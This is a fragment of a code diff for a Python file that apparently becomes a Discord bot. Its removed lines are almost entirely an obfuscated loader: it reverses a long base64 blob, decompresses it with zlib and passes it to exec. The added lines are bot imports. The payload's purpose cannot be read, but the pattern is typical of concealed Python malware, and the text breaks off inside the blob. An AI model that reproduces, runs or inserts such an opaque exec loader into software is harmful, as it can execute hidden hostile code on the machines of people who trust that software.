@@ -1,37 +1,1558 @@
-import base64
-import zlib
-import sys
-import os
+import discord
+from discord.ext import commands, tasks
+from discord.ui import View, Select, Button, Modal, TextInput
+import asyncio
+import random
+import aiohttp
+import json
+import io
+import re
+import math
+import time
+from datetime import datetime, timedelta, timezone
+from typing import Optional, Dict, List, Any, Union
 
-_code = """
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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